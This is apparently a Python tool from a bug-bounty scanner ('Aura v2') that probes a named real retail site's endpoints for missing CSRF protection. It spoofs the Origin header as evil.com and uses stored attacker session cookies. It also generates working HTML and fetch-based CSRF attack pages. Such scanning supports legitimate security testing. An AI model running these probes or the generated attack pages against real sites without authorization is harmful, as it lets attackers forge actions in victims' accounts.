"""
Aura v2 — CSRF (Cross-Site Request Forgery) Detection Engine
==============================================================
Automatically detects missing CSRF protections on state-changing endpoints
and generates standalone HTML Proof-of-Concept files ready for submission.

What it tests:
  1. Origin header bypass — removes or spoofs Origin, checks if server still accepts
  2. Referer header bypass — removes Referer, checks if server still accepts
  3. CSRF token presence — checks if POST/PATCH/DELETE requires a token in body/header
  4. SameSite cookie flag — checks if session cookies are missing SameSite=Strict/Lax

Generates:
  - `reports/csrf_poc_<endpoint>.html` — a self-contained HTML page that triggers the attack
  - `reports/csrf_findings_<target>.json` — machine-readable results

Usage:
    aura www.iciparisxl.nl --csrf
    or
    aura www.iciparisxl.nl --burp burp.xml  (then)
    aura www.iciparisxl.nl --csrf
"""

import json
import os
import re
import time
import urllib.parse
from datetime import datetime
from pathlib import Path
from typing import Optional

import requests
import urllib3
urllib3.disable_warnings()


# ─── CSRF Test Payload Configuration ──────────────────────────────────────────
CSRF_HEADERS_TO_STRIP = ["Origin", "Referer", "X-Requested-With", "X-CSRF-Token"]
CSRF_TOKEN_NAMES = [
    "csrf", "csrf_token", "_token", "csrfToken", "xsrf",
    "XSRF-TOKEN", "_csrf", "authenticity_token", "form_token",
    "requestVerificationToken", "__RequestVerificationToken",
]

HTML_POC_TEMPLATE = """\
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>CSRF PoC — {title}</title>
  <style>
    body {{ font-family: monospace; background: #1a1a1a; color: #00ff88; padding: 20px; }}
    button {{ background: #ff3355; color: white; border: none; padding: 12px 24px;
              font-size: 16px; cursor: pointer; border-radius: 4px; }}
    pre {{ background: #2a2a2a; padding: 15px; border-radius: 4px; color: #aaffcc; }}
  </style>
</head>
<body>
  <h2>🎯 CSRF Proof-of-Concept</h2>
  <p><strong>Target:</strong> {method} {url}</p>
  <p><strong>Impact:</strong> {impact}</p>
  <pre>{request_preview}</pre>

  <form id="csrf-form" action="{url}" method="{form_method}" {enctype}>
    {hidden_fields}
  </form>

  <button onclick="document.getElementById('csrf-form').submit()">
    🚀 Execute CSRF Attack
  </button>

  <script>
    // Auto-submit after 1 second for automated PoC
    // setTimeout(() => document.getElementById('csrf-form').submit(), 1000);
  </script>
</body>
</html>
"""

FETCH_POC_TEMPLATE = """\
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>CSRF PoC (Fetch) — {title}</title>
  <style>
    body {{ font-family: monospace; background: #1a1a1a; color: #00ff88; padding: 20px; }}
    button {{ background: #ff3355; color: white; border: none; padding: 12px 24px;
              font-size: 16px; cursor: pointer; border-radius: 4px; }}
    #result {{ background: #2a2a2a; padding: 15px; border-radius: 4px; color: #aaffcc; margin-top: 20px; }}
  </style>
</head>
<body>
  <h2>🎯 CSRF PoC — Cross-Site {method} Request</h2>
  <p><strong>Endpoint:</strong> {method} {url}</p>
  <p><strong>Impact:</strong> {impact}</p>

  <button onclick="sendRequest()">🚀 Execute CSRF Attack</button>
  <div id="result">Waiting...</div>

  <script>
    async function sendRequest() {{
      document.getElementById('result').textContent = 'Sending...';
      try {{
        const r = await fetch('{url}', {{
          method: '{method}',
          credentials: 'include',
          headers: {{ 'Content-Type': '{content_type}' }},
          body: {body_json},
          mode: 'no-cors',
        }});
        document.getElementById('result').textContent = 'Request sent! Check the target account for changes. Status: ' + r.status;
      }} catch(e) {{
        document.getElementById('result').textContent = 'Sent (no-cors mode — check target for changes). Error: ' + e;
      }}
    }}
  </script>
</body>
</html>
"""


class CSRFEngine:
    """
    Automated CSRF detection engine.
    Tests discovered mutating endpoints for missing CSRF protections.
    """

    def __init__(
        self,
        target: str,
        cookies_str: str,
        output_dir: str = "./reports",
        timeout: int = 15,
        proxy: Optional[str] = None,
    ):
        if not target.startswith("http"):
            target = "https://" + target
        self.target = target.rstrip("/")
        self.target_domain = urllib.parse.urlparse(self.target).netloc
        self.cookies = self._parse_cookies(cookies_str)
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.timeout = timeout
        self.proxy = {"http": proxy, "https": proxy} if proxy else None
        self.findings: list[dict] = []

    @staticmethod
    def _parse_cookies(cookie_str: str) -> dict:
        cookies = {}
        for part in cookie_str.split(";"):
            part = part.strip()
            if "=" in part:
                k, _, v = part.partition("=")
                cookies[k.strip()] = v.strip()
        return cookies

    def _request(
        self,
        method: str,
        url: str,
        body: Optional[str] = None,
        extra_headers: Optional[dict] = None,
        strip_headers: Optional[list] = None,
    ) -> Optional[requests.Response]:
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json, text/plain, */*",
            "Origin": f"https://{self.target_domain}",
            "Referer": f"https://{self.target_domain}/",
            "Content-Type": "application/json",
            "X-Requested-With": "XMLHttpRequest",
        }
        if extra_headers:
            headers.update(extra_headers)
        if strip_headers:
            for h in strip_headers:
                headers.pop(h, None)

        try:
            return requests.request(
                method=method,
                url=url,
                headers=headers,
                cookies=self.cookies,
                data=body,
                timeout=self.timeout,
                verify=False,
                proxies=self.proxy,
                allow_redirects=False,
            )
        except Exception:
            return None

    def _check_samesite(self, url: str) -> list[str]:
        """Checks if session cookies are missing SameSite protection."""
        issues = []
        try:
            resp = requests.get(
                url, cookies=self.cookies, timeout=self.timeout, verify=False
            )
            for cookie in resp.cookies:
                if cookie.name in ("PIM-SESSION-ID", "JSESSIONID", "sessionid", "session"):
                    if not cookie.has_nonstandard_attr("SameSite"):
                        issues.append(
                            f"Session cookie `{cookie.name}` missing SameSite attribute — "
                            f"browser will send it on cross-origin requests"
                        )
                    elif cookie.get_nonstandard_attr("SameSite", "").lower() == "none" and not cookie.secure:
                        issues.append(
                            f"Cookie `{cookie.name}` has SameSite=None without Secure flag"
                        )
        except Exception:
            pass
        return issues

    def test_endpoint(self, endpoint: dict) -> Optional[dict]:
        """
        Tests a single endpoint for CSRF vulnerabilities.
        Returns a finding dict if confirmed, else None.
        """
        url = endpoint.get("url", "")
        method = endpoint.get("method", "POST")
        body = endpoint.get("post_data") or '{"test": 1}'

        print(f"\n  🔍 [{method}] {url[:80]}")

        # Baseline: normal request (should work)
        baseline = self._request(method, url, body=body)
        if not baseline or baseline.status_code not in (200, 201, 204, 400, 422):
            print(f"     ⏭️  Skipping — baseline returned {baseline.status_code if baseline else 'no response'}")
            return None

        baseline_status = baseline.status_code
        print(f"     📊 Baseline: HTTP {baseline_status}")

        # Test 1: Remove Origin + Referer (Cross-origin simulation)
        no_origin = self._request(
            method, url, body=body,
            strip_headers=["Origin", "Referer", "X-Requested-With"]
        )

        # Test 2: Spoof Origin from evil.com
        evil_origin = self._request(
            method, url, body=body,
            extra_headers={"Origin": "https://evil.com", "Referer": "https://evil.com/csrf.html"}
        )

        # Analyze results
        csrf_confirmed = False
        csrf_method = ""

        if no_origin and no_origin.status_code == baseline_status:
            csrf_confirmed = True
            csrf_method = "No Origin/Referer check — cross-origin requests accepted"
            print(f"     🚨 No Origin check! Same response without Origin header (HTTP {no_origin.status_code})")

        if evil_origin and evil_origin.status_code == baseline_status and not csrf_confirmed:
            csrf_confirmed = True
            csrf_method = "Origin not validated — evil.com accepted as valid origin"
            print(f"     🚨 Evil origin accepted! HTTP {evil_origin.status_code} from evil.com")

        if not csrf_confirmed:
            print(f"     ✅ Origin/Referer validation appears active")
            return None

        # Check SameSite
        samesite_issues = self._check_samesite(self.target)

        # Build the finding
        finding = {
            "url": url,
            "method": method,
            "csrf_method": csrf_method,
            "baseline_status": baseline_status,
            "samesite_issues": samesite_issues,
            "post_data": body,
            "severity": "MEDIUM",
            "cvss_score": 6.5,
            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N",
            "owasp": "A01:2021 — Broken Access Control",
            "timestamp": datetime.utcnow().isoformat(),
        }

        # Upgrade severity if samesite is missing
        if samesite_issues:
            finding["severity"] = "HIGH"
            finding["cvss_score"] = 8.0
            finding["samesite_issues"] = samesite_issues

        # Generate PoC file
        poc_path = self._generate_poc(finding)
        finding["poc_file"] = str(poc_path)

        print(f"     💥 CSRF CONFIRMED! [{csrf_method}]")
        if poc_path:
            print(f"     📄 PoC saved: {poc_path}")

        self.findings.append(finding)
        return finding

    def _generate_poc(self, finding: dict) -> Optional[Path]:
        """Generates a standalone HTML PoC file for the CSRF finding."""
        url = finding["url"]
        method = finding["method"]
        body = finding.get("post_data", "")

        # Parse body for form fields
        hidden_fields = ""
        try:
            body_data = json.loads(body) if body.strip().startswith("{") else {}
            for k, v in body_data.items():
                hidden_fields += f'    <input type="hidden" name="{k}" value="{v}">\n'
        except Exception:
            hidden_fields = f'    <input type="hidden" name="data" value="{body}">\n'

        title = f"{method} {urllib.parse.urlparse(url).path[:40]}"
        impact = (
            f"An attacker can trick an authenticated user into unknowingly executing "
            f"a {method} request to {url} from a malicious website."
        )

        # Choose form or fetch PoC based on method
        if method in ("POST", "GET"):
            form_method = method.lower()
            enctype = 'enctype="application/x-www-form-urlencoded"'
            content = HTML_POC_TEMPLATE.format(
                title=title,
                method=method,
                url=url,
                impact=impact,
                request_preview=f"{method} {url}\nContent-Type: application/x-www-form-urlencoded\n\n{body[:200]}",
                form_method=form_method,
                enctype=enctype,
                hidden_fields=hidden_fields,
            )
        else:  # PATCH, PUT, DELETE
            content_type = "application/json"
            body_json = json.dumps(body) if body else "null"
            content = FETCH_POC_TEMPLATE.format(
                title=title,
                method=method,
                url=url,
                impact=impact,
                content_type=content_type,
                body_json=body_json,
            )

        slug = re.sub(r'[^a-z0-9]', '_', url.lower())[:40]
        poc_path = self.output_dir / f"csrf_poc_{slug}.html"
        poc_path.write_text(content, encoding="utf-8")
        return poc_path

    def run_from_discovery_map(self, map_path: str) -> list[dict]:
        """Loads a discovery map and tests all mutating endpoints for CSRF."""
        map_path = Path(map_path)
        if not map_path.exists():
            print(f"❌ Discovery map not found: {map_path}")
            print("   Run: aura <target> --crawl  or  aura <target> --burp file.xml  first!")
            return []

        with open(map_path, encoding="utf-8-sig") as f:
            discovery_map = json.load(f)

        mutating = discovery_map.get("mutating_endpoints", [])
        meta = discovery_map.get("meta", {})

        print(f"\n{'='*65}")
        print(f"🔴 AURA v2 — CSRF Detection Engine")
        print(f"🎯 Target: {meta.get('target', self.target)}")
        print(f"⚡ Mutating Endpoints to Test: {len(mutating)}")
        print(f"{'='*65}")

        if not mutating:
            print("\n⚠️  No mutating endpoints found in the discovery map!")
            print("   Tip: CSRF only applies to state-changing endpoints (POST/PATCH/DELETE).")
            print("   Make sure your crawl captured authenticated API calls.")
            return []

        for ep in mutating:
            time.sleep(0.5)  # Be polite
            self.test_endpoint(ep)

        return self._finalize(meta)

    def _finalize(self, meta: dict) -> list[dict]:
        """Prints summary and saves findings."""
        print(f"\n{'='*65}")
        print(f"✅ CSRF SCAN COMPLETE")
        print(f"{'='*65}")
        print(f"  🚨 CSRF Confirmed : {len(self.findings)}")

        if self.findings:
            print(f"\n{'🔴'*30}")
            for i, f in enumerate(self.findings, 1):
                print(f"\n  [{i}] [{f['method']}] {f['url'][:75]}")
                print(f"       {f['csrf_method']}")
                print(f"       Severity: {f['severity']} | CVSS: {f['cvss_score']}")
                print(f"       PoC: {f.get('poc_file', '')}")
            print(f"\n{'🔴'*30}")

            # Save JSON findings
            target_slug = self.target_domain.replace(".", "_").replace("www_", "")
            out_path = self.output_dir / f"csrf_findings_{target_slug}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            with open(out_path, "w", encoding="utf-8") as f:
                json.dump({"target": self.target, "findings": self.findings}, f, indent=2)
            print(f"\n  💾 Findings saved: {out_path}")
        else:
            print("\n  ✅ No CSRF vulnerabilities detected on tested endpoints.")

        return self.findings


def run_csrf_scan(target: str, discovery_map_path: Optional[str] = None) -> list[dict]:
    """CLI runner for `aura <target> --csrf`."""
    from dotenv import load_dotenv
    load_dotenv()

    cookies_str = os.getenv("AUTH_TOKEN_ATTACKER", "")
    if not cookies_str:
        print("❌ AUTH_TOKEN_ATTACKER not set in .env!")
        return []

    # Auto-detect discovery map
    if not discovery_map_path:
        target_slug = target.replace("www.", "").replace(".", "_")
        candidate = Path(f"./reports/discovery_map_{target_slug}.json")
        if candidate.exists():
            discovery_map_path = str(candidate)
        else:
            print(f"❌ No discovery map found. Run: aura {target} --crawl  first!")
            return []

    engine = CSRFEngine(target=target, cookies_str=cookies_str)
    return engine.run_from_discovery_map(discovery_map_path)


if __name__ == "__main__":
    import sys
    target = sys.argv[1] if len(sys.argv) > 1 else "www.iciparisxl.nl"
    run_csrf_scan(target)
